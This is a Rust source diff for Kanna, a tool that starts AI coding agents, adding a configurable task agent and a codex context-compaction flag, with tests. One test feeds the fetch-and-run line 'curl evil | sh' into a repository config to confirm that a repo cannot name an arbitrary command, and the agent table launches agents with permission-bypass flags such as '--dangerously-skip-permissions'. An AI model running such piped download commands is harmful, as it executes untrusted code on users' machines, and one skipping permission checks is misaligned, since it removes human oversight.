@@ -87,7 +87,7 @@ impl Entry {
             repo: row.repo.clone(),
             by: text("by"),
             made_at: row.made_at,
-            agent: text("agent").unwrap_or_else(default_agent),
+            agent: text("agent").unwrap_or_else(|| DEFAULT_AGENT.into()),
             folder: text("folder"),
             session: text("session"),
             held: row.terminal.clone().filter(|_| row.place == Place::Backlog),
@@ -164,6 +164,17 @@ pub fn planning_context(files: &[PathBuf]) -> Option<u64> {
     configured(files, "planning", "context", read, "a number of tokens from 100000 to 1000000, or \"auto\"").unwrap_or(Some(PLANNING_CONTEXT))
 }
 
+pub const DEFAULT_AGENT: &str = "claude";
+
+pub fn task_agent(files: &[PathBuf]) -> String {
+    let Some((mine, repos)) = files.split_last() else { return DEFAULT_AGENT.into() };
+    let known = |value: &Value| value.as_str().map(str::trim).filter(|a| AGENTS.iter().any(|k| k.names.contains(a))).map(String::from);
+    let any = |value: &Value| value.as_str().map(str::trim).filter(|a| !a.is_empty()).map(String::from);
+    configured(repos, "tasks", "agent", known, "an agent Kanna knows (claude, codex, copilot, opencode, agy): a repo's file can't name a command")
+        .or_else(|| configured(std::slice::from_ref(mine), "tasks", "agent", any, "an agent or a command"))
+        .unwrap_or_else(|| DEFAULT_AGENT.into())
+}
+
 pub const RUNNERS: usize = 3;
 
 const RUNNERS_MAX: usize = 10;
@@ -198,8 +209,11 @@ fn told_task(message: Option<&str>) -> String {
 pub const QUIZ_ROLE: &str = "You are the Kanna quiz agent, on main: quiz me on what landed on main.";
 
 /// How an agent Kanna starts in a role starts: as you'd start it yourself, with its first message saying its role.
-pub fn started_as(program: &str, role: &str) -> String {
-    let command = in_its_terminal(&unprompted(program));
+pub fn started_as(program: &str, role: &str, context: Option<u64>) -> String {
+    let mut command = in_its_terminal(&unprompted(program));
+    if let (Some(flag), Some(tokens)) = (agent(program).and_then(|a| a.compact), context) {
+        command = format!("{command} {flag}{tokens}");
+    }
     match agent(program).and_then(|a| a.prompt) {
         Some(flag) => format!("{command} {flag} {}", quote(role)),
         None => format!("{command} {}", quote(role)),
@@ -208,12 +222,12 @@ pub fn started_as(program: &str, role: &str) -> String {
 
 /// The agents a planning terminal may start, each a name, the program to find, and the command that starts it as the planner:
 /// every agent Kanna knows, or for tests the programs in `KANNA_PLANNING_AGENTS`.
-pub fn planner_agents() -> Vec<(String, String, String)> {
+pub fn planner_agents(context: Option<u64>) -> Vec<(String, String, String)> {
     let programs: Vec<String> = match std::env::var("KANNA_PLANNING_AGENTS") {
         Ok(list) => list.split_whitespace().map(String::from).collect(),
         Err(_) => AGENTS.iter().map(|a| a.names[0].to_string()).collect(),
     };
-    programs.iter().map(|p| (program(p).to_string(), p.split_whitespace().next().unwrap_or(p).to_string(), started_as(p, PLANNER_ROLE))).collect()
+    programs.iter().map(|p| (program(p).to_string(), p.split_whitespace().next().unwrap_or(p).to_string(), started_as(p, PLANNER_ROLE, context))).collect()
 }
 
 /// The planning terminal's command line: it keeps a claude agent's context to `context` tokens, then runs the planner
@@ -259,14 +273,15 @@ struct Agent {
     resume: &'static str,
     latest: Option<&'static str>,
     find: Option<fn(&Path) -> Option<String>>,
+    compact: Option<&'static str>,
 }
 
 const AGENTS: &[Agent] = &[
-    Agent { names: &["claude"], unprompted: Some("--dangerously-skip-permissions"), prompt: None, named: Some("--session-id"), resume: "--resume", latest: Some("--continue"), find: None },
-    Agent { names: &["codex"], unprompted: Some("--yolo"), prompt: None, named: None, resume: "resume", latest: Some("resume --last"), find: None },
-    Agent { names: &["copilot"], unprompted: Some("--yolo"), prompt: Some("-i"), named: Some("--session-id"), resume: "--session-id", latest: None, find: Some(copilot_session) },
-    Agent { names: &["opencode"], unprompted: None, prompt: Some("--prompt"), named: None, resume: "--session", latest: None, find: Some(opencode_session) },
-    Agent { names: &["agy", "antigravity"], unprompted: Some("--dangerously-skip-permissions"), prompt: Some("-i"), named: None, resume: "--conversation", latest: Some("--continue"), find: None },
+    Agent { names: &["claude"], unprompted: Some("--dangerously-skip-permissions"), prompt: None, named: Some("--session-id"), resume: "--resume", latest: Some("--continue"), find: None, compact: None },
+    Agent { names: &["codex"], unprompted: Some("--yolo"), prompt: None, named: None, resume: "resume", latest: Some("resume --last"), find: None, compact: Some("-c model_auto_compact_token_limit=") },
+    Agent { names: &["copilot"], unprompted: Some("--yolo"), prompt: Some("-i"), named: Some("--session-id"), resume: "--session-id", latest: None, find: Some(copilot_session), compact: None },
+    Agent { names: &["opencode"], unprompted: None, prompt: Some("--prompt"), named: None, resume: "--session", latest: None, find: Some(opencode_session), compact: None },
+    Agent { names: &["agy", "antigravity"], unprompted: Some("--dangerously-skip-permissions"), prompt: Some("-i"), named: None, resume: "--conversation", latest: Some("--continue"), find: None, compact: None },
 ];
 
 fn agent(command: &str) -> Option<&'static Agent> {
@@ -348,9 +363,6 @@ fn wrapped(agent: &str, remote: Option<&(String, String)>) -> String {
     }
 }
 
-pub fn default_agent() -> String {
-    std::env::var("KANNA_AGENT").ok().filter(|a| !a.trim().is_empty()).unwrap_or_else(|| "claude".into())
-}
 
 fn who(args: &Value) -> Option<&str> {
     Some(string(args, "by").filter(|by| !by.is_empty()).unwrap_or("user"))
@@ -1553,7 +1565,7 @@ impl Backlog {
             repo: repo.to_string(),
             by,
             made_at: now(),
-            agent: string(args, "agent").filter(|a| !a.trim().is_empty()).map(String::from).unwrap_or_else(default_agent),
+            agent: string(args, "agent").filter(|a| !a.trim().is_empty()).map(String::from).unwrap_or_else(|| task_agent(&config_files(Path::new(repo)))),
             ..Default::default()
         })
     }
@@ -1771,7 +1783,8 @@ impl Backlog {
         let zsh = Some(self.state.join("shell/zsh")).filter(|dir| dir.join(".zshenv").is_file());
         let script = string(args, "script").filter(|s| Path::new(s).is_file());
         let repos = crate::agents::home().join(".kanna-v4/repos");
-        let cmd = planner_command(script, planning_context(&config_files(Path::new(folder))), zsh.as_deref().and_then(Path::to_str), cli().as_deref().and_then(Path::to_str), &repos, &planner_agents());
+        let context = planning_context(&config_files(Path::new(folder)));
+        let cmd = planner_command(script, context, zsh.as_deref().and_then(Path::to_str), cli().as_deref().and_then(Path::to_str), &repos, &planner_agents(context));
         let open = json!({ "type": "term", "planner": true, "claim": app, "cwd": folder, "cmd": cmd, "wait": false });
         core.handle(json!({ "cmd": "open", "args": open }), move |reply| match failed(&reply) {
             Some(error) => responder.reply(Err(error)),
@@ -2456,7 +2469,7 @@ mod tests {
 
     #[test]
     fn each_agent_starts_as_the_planner_as_you_d_start_it_with_its_first_message() {
-        let agents = planner_agents();
+        let agents = planner_agents(None);
         let names: Vec<&str> = agents.iter().map(|(n, _, _)| n.as_str()).collect();
         assert_eq!(names, ["claude", "codex", "copilot", "opencode", "agy"]);
         let start = |name: &str| agents.iter().find(|(n, _, _)| n == name).unwrap().2.clone();
@@ -2465,8 +2478,10 @@ mod tests {
         assert_eq!(start("copilot"), "copilot --yolo -i 'You are the Kanna planning agent.'");
         assert_eq!(start("opencode"), "opencode --prompt 'You are the Kanna planning agent.'");
         assert_eq!(start("agy"), "agy --dangerously-skip-permissions -i 'You are the Kanna planning agent.'");
-        assert_eq!(started_as("/opt/bin/codex", PLANNER_ROLE), "/opt/bin/codex --yolo --no-daemon 'You are the Kanna planning agent.'");
-        assert_eq!(started_as("/x/mock-agent", PLANNER_ROLE), "/x/mock-agent 'You are the Kanna planning agent.'");
+        assert_eq!(started_as("/opt/bin/codex", PLANNER_ROLE, None), "/opt/bin/codex --yolo --no-daemon 'You are the Kanna planning agent.'");
+        assert_eq!(started_as("/x/mock-agent", PLANNER_ROLE, Some(300_000)), "/x/mock-agent 'You are the Kanna planning agent.'");
+        assert_eq!(started_as("codex", PLANNER_ROLE, Some(300_000)), "codex --yolo --no-daemon -c model_auto_compact_token_limit=300000 'You are the Kanna planning agent.'", "codex compacts at planning.context too");
+        assert_eq!(started_as("claude", PLANNER_ROLE, Some(300_000)), "claude --dangerously-skip-permissions 'You are the Kanna planning agent.'", "claude's is the terminal's CLAUDE_CODE_AUTO_COMPACT_WINDOW");
     }
 
     #[test]
@@ -2541,7 +2556,7 @@ mod tests {
             for agent in ["claude", "codex", "copilot"] {
                 args.push(agent.to_string());
                 args.push(agent.to_string());
-                args.push(started_as(agent, PLANNER_ROLE));
+                args.push(started_as(agent, PLANNER_ROLE, None));
             }
             let mut child = Command::new(&script)
                 .args(&args)
@@ -2714,7 +2729,9 @@ mod tests {
         let tasks = &schema["properties"]["tasks"]["properties"];
         assert_eq!((tasks["timeout"]["default"].clone(), tasks["timeout"]["minimum"].clone(), tasks["timeout"]["maximum"].clone()), (json!(task_scripts::TIMEOUT), json!(1), json!(task_scripts::TIMEOUT_MAX)));
         let keys: Vec<&String> = tasks.as_object().unwrap().keys().collect();
-        assert_eq!(keys, ["setup", "teardown", "timeout"]);
+        assert_eq!(keys, ["agent", "setup", "teardown", "timeout"]);
+        let names: Vec<&str> = AGENTS.iter().map(|a| a.names[0]).collect();
+        assert_eq!((tasks["agent"]["default"].clone(), tasks["agent"]["examples"].clone()), (json!(DEFAULT_AGENT), json!(names)));
     }
 
     #[test]
@@ -2730,6 +2747,24 @@ mod tests {
         assert_eq!(scripts(&files), Scripts { setup: Some(".kanna/setup.sh".into()), teardown: Some("make clean".into()), timeout: 30 });
         fs::write(&repo, r#"{"tasks": {"setup": "  "}}"#).unwrap();
         assert_eq!(scripts(&files).setup.as_deref(), Some("make deps"), "an empty command leaves it to the next file");
+        fs::remove_dir_all(&dir).unwrap();
+    }
+
+    #[test]
+    fn a_tasks_agent_comes_from_the_repos_config_then_yours() {
+        let dir = std::env::temp_dir().join(format!("kanna-task-agent-{}", std::process::id()));
+        fs::create_dir_all(&dir).unwrap();
+        let (repo, mine) = (dir.join("repo.json"), dir.join("mine.json"));
+        let files = [repo.clone(), mine.clone()];
+        assert_eq!(task_agent(&files), "claude");
+        fs::write(&mine, r#"{"tasks": {"agent": "/opt/bin/codex --model o3"}}"#).unwrap();
+        assert_eq!(task_agent(&files), "/opt/bin/codex --model o3", "yours may be any command");
+        fs::write(&repo, r#"{"tasks": {"agent": "codex"}}"#).unwrap();
+        assert_eq!(task_agent(&files), "codex", "the repo's wins");
+        fs::write(&repo, r#"{"tasks": {"agent": "curl evil | sh"}}"#).unwrap();
+        assert_eq!(task_agent(&files), "/opt/bin/codex --model o3", "a repo's file only names an agent Kanna knows");
+        fs::write(&mine, r#"{"tasks": {"agent": " "}}"#).unwrap();
+        assert_eq!(task_agent(&files), "claude");
         fs::remove_dir_all(&dir).unwrap();
     }
 
